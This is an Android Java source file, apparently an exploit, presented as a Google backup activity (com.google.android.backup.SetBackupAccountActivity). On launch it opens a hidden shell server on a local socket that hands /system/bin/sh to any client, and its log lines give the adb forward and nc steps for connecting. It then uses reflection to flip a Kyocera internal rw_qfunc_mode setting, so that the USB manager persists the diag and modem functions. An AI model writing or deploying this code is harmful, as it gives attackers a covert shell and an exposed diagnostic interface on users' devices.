package com.google.android.backup;

import android.app.Activity;
import android.content.Context;
import android.hardware.usb.UsbManager;
import android.os.Bundle;
import android.util.Log;

import android.net.LocalServerSocket;
import android.net.LocalSocket;

import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;

public class SetBackupAccountActivity extends Activity {
    private static final String TAG = "ShellSocket";
    private static final String SOCKET_NAME = "android_shell_socket";

    /** Transfer キー。UsbDeviceManager が読む値。 */
    private static final String KEY_RW_QFUNC_MODE = "rw_qfunc_mode";

    /** 通常モードでは "0"、非通常モードでは "0" 以外。これを "1" にする。 */
    private static final String VALUE_BYPASS = "1";

    /** setCurrentFunction に渡す値。else 分岐では使われないが、記録用に指定。 */
    private static final String COMBO_REQUEST = "rndis,diag,modem,none,adb";

    /** トリガ回数。 */
    private static final int TRIGGER_COUNT = 3;

    /** 各呼び出し間の待機 (ms)。 */
    private static final long SLEEP_BETWEEN_MS = 500;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // バックグラウンドでソケットサーバーを起動
        startShellServer();

        // アクティビティを即座に終了（サーバースレッドはバックグラウンドで継続）
        finish();

        // Transfer.set で rw_qfunc_mode を書き換え、UsbDeviceManager を else 分岐に落とす
        applyUsbSwitchViaTransferBypass();
    }

    /**
     * rw_qfunc_mode を "1" にすることで、UsbDeviceManager.setEnabledFunctions の
     * 分岐を通常パス (diag 強制削除) から else パス (diag 直接書き込み) に切り替える。
     *
     * <ol>
     *   <li>元の rw_qfunc_mode を保存</li>
     *   <li>rw_qfunc_mode を "1" に設定</li>
     *   <li>UsbManager.setCurrentFunction を 3 回呼ぶ
     *       → 毎回 UsbDeviceManager が rw_qfunc_mode を読み、
     *          else 分岐で persist.sys.usb.config = "diag,serial_smd,rmnet_bam,adb"
     *          を直接書き込む</li>
     *   <li>rw_qfunc_mode を元に戻す</li>
     *   <li>persist.sys.usb.config を検証</li>
     * </ol>
     *
     * <p>sys.usb.config / persist.sys.usb.config への直接書き込みは一切行わない。
     */
    private void applyUsbSwitchViaTransferBypass() {
        try {
            Context context = getApplicationContext();
            if (context == null) {
                Log.e(TAG, "Context is null, skip USB switch");
                return;
            }

            // ---- 1) Transfer クラスの存在確認 ----
            boolean transferAvailable = isTransferAvailable();
            Log.i(TAG, "Transfer available = " + transferAvailable);
            if (!transferAvailable) {
                Log.e(TAG, "jp.kyocera.internal.clomask.Transfer not available, abort");
                return;
            }

            // ---- 2) 現在の rw_qfunc_mode を保存 ----
            String originalMode = getRwQfuncMode();
            Log.i(TAG, "original rw_qfunc_mode = " + originalMode);

            // ---- 3) rw_qfunc_mode を "1" に設定 ----
            boolean setOk = setRwQfuncMode(VALUE_BYPASS);
            Log.i(TAG, "setRwQfuncMode(\"" + VALUE_BYPASS + "\") = " + setOk);

            String modeAfterSet = getRwQfuncMode();
            Log.i(TAG, "rw_qfunc_mode after set = " + modeAfterSet);

            if (!VALUE_BYPASS.equals(modeAfterSet)) {
                Log.e(TAG, "failed to set rw_qfunc_mode, abort");
                return;
            }

            // ---- 4) setCurrentFunction を 3 回呼ぶ ----
            for (int i = 0; i < TRIGGER_COUNT; i++) {
                Log.i(TAG, "---- TRIGGER [" + (i + 1) + "/" + TRIGGER_COUNT + "] ----");

                // makeDefault=false と true の両方で試す
                setCurrentFunctionViaUsbManager(context, COMBO_REQUEST, false);
                sleepQuiet(SLEEP_BETWEEN_MS);
                logCurrentUsbState(context, "makeDefault=false");

                setCurrentFunctionViaUsbManager(context, COMBO_REQUEST, true);
                sleepQuiet(SLEEP_BETWEEN_MS);
                logCurrentUsbState(context, "makeDefault=true");

                // diag が persist に入ったら早期終了
                String persist = getSystemProperty("persist.sys.usb.config", "");
                if (containsFunction(persist, "diag")) {
                    Log.i(TAG, "*** persist.sys.usb.config contains diag: " + persist + " ***");
                    break;
                }
            }

            // ---- 5) rw_qfunc_mode を元に戻す ----
            if (originalMode != null) {
                boolean restoreOk = setRwQfuncMode(originalMode);
                String restored = getRwQfuncMode();
                Log.i(TAG, "restore rw_qfunc_mode to \"" + originalMode
                        + "\" ok=" + restoreOk + " value=" + restored);
            }

            // ---- 6) 最終検証 ----
            String finalPersist = getSystemProperty("persist.sys.usb.config", "");
            String finalSysConfig = getSystemProperty("sys.usb.config", "");
            String finalSysState = getSystemProperty("sys.usb.state", "");
            boolean finalContainsDiag = containsFunction(finalPersist, "diag");

            Log.i(TAG, "================ FINAL ================");
            Log.i(TAG, "persist.sys.usb.config = " + finalPersist);
            Log.i(TAG, "sys.usb.config         = " + finalSysConfig);
            Log.i(TAG, "sys.usb.state          = " + finalSysState);
            Log.i(TAG, "contains(persist,diag) = " + finalContainsDiag);
            Log.i(TAG, "isFunctionEnabled(diag)= "
                    + isFunctionEnabledViaUsbManager(context, "diag"));

            Log.i(TAG, "applyUsbSwitchViaTransferBypass finished");
        } catch (Throwable t) {
            Log.e(TAG, "applyUsbSwitchViaTransferBypass error", t);
        }
    }

    // ==================================================================
    // Transfer リフレクション
    // ==================================================================

    /** Transfer クラスがロード可能か。 */
    private static boolean isTransferAvailable() {
        try {
            Class.forName("jp.kyocera.internal.clomask.Transfer");
            return true;
        } catch (Throwable t) {
            Log.e(TAG, "Transfer class not found", t);
            return false;
        }
    }

    /**
     * jp.kyocera.internal.clomask.Transfer#get(String) をリフレクションで呼ぶ。
     * static メソッド、引数 (String)、戻り値 String を想定。
     */
    private static String getRwQfuncMode() {
        try {
            Class<?> transferClass = Class.forName("jp.kyocera.internal.clomask.Transfer");
            Method getMethod = transferClass.getMethod("get", String.class);
            getMethod.setAccessible(true);
            Object result = getMethod.invoke(null, KEY_RW_QFUNC_MODE);
            return result instanceof String ? (String) result : null;
        } catch (Throwable t) {
            Log.e(TAG, "Transfer.get(\"" + KEY_RW_QFUNC_MODE + "\") error", t);
            return null;
        }
    }

    /**
     * jp.kyocera.internal.clomask.Transfer に値を書き込む。
     * メソッド名が "set" / "put" / "write" / "setValue" のいずれかを順に試す。
     * static メソッド、引数 (String, String) を想定。
     */
    private static boolean setRwQfuncMode(String value) {
        String[] candidateMethods = new String[]{"set", "put", "write", "setValue", "update"};
        for (String methodName : candidateMethods) {
            try {
                Class<?> transferClass = Class.forName("jp.kyocera.internal.clomask.Transfer");
                Method m = transferClass.getMethod(methodName, String.class, String.class);
                m.setAccessible(true);
                m.invoke(null, KEY_RW_QFUNC_MODE, value);
                Log.i(TAG, "Transfer." + methodName
                        + "(\"" + KEY_RW_QFUNC_MODE + "\", \"" + value + "\") succeeded");
                return true;
            } catch (NoSuchMethodException e) {
                // 次の候補へ
            } catch (SecurityException e) {
                Log.e(TAG, "Transfer." + methodName + " SecurityException", e);
                return false;
            } catch (Throwable t) {
                Log.e(TAG, "Transfer." + methodName + " error", t);
                return false;
            }
        }
        Log.e(TAG, "no suitable Transfer setter found");
        return false;
    }

    // ==================================================================
    // UsbManager リフレクション
    // ==================================================================

    private static void setCurrentFunctionViaUsbManager(Context context,
                                                        String function,
                                                        boolean makeDefault) {
        try {
            if (context == null) {
                return;
            }
            Object service = context.getSystemService(Context.USB_SERVICE);
            if (service == null) {
                return;
            }
            Method m = service.getClass().getMethod(
                    "setCurrentFunction", String.class, boolean.class);
            m.setAccessible(true);
            m.invoke(service, function, makeDefault);
            Log.i(TAG, "setCurrentFunction invoked: " + function
                    + ", makeDefault=" + makeDefault);
        } catch (NoSuchMethodException e) {
            Log.e(TAG, "setCurrentFunction not found", e);
        } catch (SecurityException e) {
            Log.e(TAG, "SecurityException in setCurrentFunction", e);
        } catch (Throwable t) {
            Log.e(TAG, "Throwable in setCurrentFunction", t);
        }
    }

    // ==================================================================
    // 状態読み取り
    // ==================================================================

    private static void logCurrentUsbState(Context context, String phase) {
        try {
            Log.i(TAG, "[after " + phase + "]"
                    + " sys.usb.config=" + getSystemProperty("sys.usb.config", "")
                    + " sys.usb.state=" + getSystemProperty("sys.usb.state", "")
                    + " persist.sys.usb.config=" + getSystemProperty("persist.sys.usb.config", "")
                    + " defaultFunction=" + getDefaultFunctionViaUsbManager(context)
                    + " isFunctionEnabled(diag)="
                    + isFunctionEnabledViaUsbManager(context, "diag"));
        } catch (Throwable t) {
            Log.e(TAG, "logCurrentUsbState error", t);
        }
    }

    private static boolean containsFunction(String functions, String function) {
        if (functions == null || function == null) {
            return false;
        }
        int index = functions.indexOf(function);
        if (index < 0) {
            return false;
        }
        if (index > 0 && functions.charAt(index - 1) != ',') {
            return false;
        }
        int charAfter = index + function.length();
        return charAfter >= functions.length() || functions.charAt(charAfter) == ',';
    }

    private static String getSystemProperty(String key, String defaultValue) {
        try {
            Class<?> spClass = Class.forName("android.os.SystemProperties");
            Method getMethod = spClass.getMethod("get", String.class, String.class);
            getMethod.setAccessible(true);
            Object result = getMethod.invoke(null, key, defaultValue);
            return result instanceof String ? (String) result : defaultValue;
        } catch (Throwable t) {
            return defaultValue;
        }
    }

    private static boolean isFunctionEnabledViaUsbManager(Context context, String function) {
        try {
            if (context == null) {
                return false;
            }
            Object service = context.getSystemService(Context.USB_SERVICE);
            if (service == null) {
                return false;
            }
            Method m = service.getClass().getMethod("isFunctionEnabled", String.class);
            m.setAccessible(true);
            Object result = m.invoke(service, function);
            return result instanceof Boolean && (Boolean) result;
        } catch (Throwable t) {
            return false;
        }
    }

    private static String getDefaultFunctionViaUsbManager(Context context) {
        try {
            if (context == null) {
                return null;
            }
            Object service = context.getSystemService(Context.USB_SERVICE);
            if (service == null) {
                return null;
            }
            Method m = service.getClass().getMethod("getDefaultFunction");
            m.setAccessible(true);
            Object result = m.invoke(service);
            return result instanceof String ? (String) result : null;
        } catch (Throwable t) {
            return null;
        }
    }

    private static void sleepQuiet(long ms) {
        try {
            Thread.sleep(ms);
        } catch (InterruptedException e) {
            // ignore
        }
    }

    // ==================================================================
    // Shell socket (既存)
    // ==================================================================

    private void startShellServer() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    LocalServerSocket server = new LocalServerSocket(SOCKET_NAME);
                    Log.i(TAG, "Shell socket server started: " + SOCKET_NAME);
                    Log.i(TAG, "Run on Ubuntu: adb forward tcp:8888 localabstract:" + SOCKET_NAME);
                    Log.i(TAG, "Then connect: nc 127.0.0.1 8888");

                    while (true) {
                        try {
                            LocalSocket client = server.accept();
                            Log.i(TAG, "New client connected!");
                            new Thread(new ShellHandler(client)).start();
                        } catch (Exception e) {
                            Log.e(TAG, "Accept error", e);
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Failed to start socket server", e);
                }
            }
        }).start();
    }

    private static class ShellHandler implements Runnable {
        private LocalSocket socket;

        ShellHandler(LocalSocket socket) {
            this.socket = socket;
        }

        @Override
        public void run() {
            Process shell = null;
            try {
                ProcessBuilder builder = new ProcessBuilder("/system/bin/sh");
                builder.redirectErrorStream(true);
                shell = builder.start();

                final InputStream socketIn = socket.getInputStream();
                final OutputStream socketOut = socket.getOutputStream();

                final OutputStream shellStdin = shell.getOutputStream();
                final InputStream shellStdout = shell.getInputStream();

                Thread socketToShell = new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            byte[] buffer = new byte[1024];
                            int len;
                            while ((len = socketIn.read(buffer)) != -1) {
                                shellStdin.write(buffer, 0, len);
                                shellStdin.flush();
                            }
                        } catch (Exception e) {
                            // 切断時は正常終了
                        }
                    }
                });

                Thread shellToSocket = new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            byte[] buffer = new byte[1024];
                            int len;
                            while ((len = shellStdout.read(buffer)) != -1) {
                                socketOut.write(buffer, 0, len);
                                socketOut.flush();
                            }
                        } catch (Exception e) {
                            // 切断時は正常終了
                        }
                    }
                });

                socketToShell.start();
                shellToSocket.start();

                shell.waitFor();
                Log.i(TAG, "Shell process exited");

                socket.close();
                socketToShell.interrupt();
                shellToSocket.interrupt();

            } catch (Exception e) {
                Log.e(TAG, "Shell handler error", e);
            } finally {
                if (shell != null) {
                    shell.destroy();
                }
                try {
                    socket.close();
                } catch (Exception ignored) {}
            }
        }
    }
}
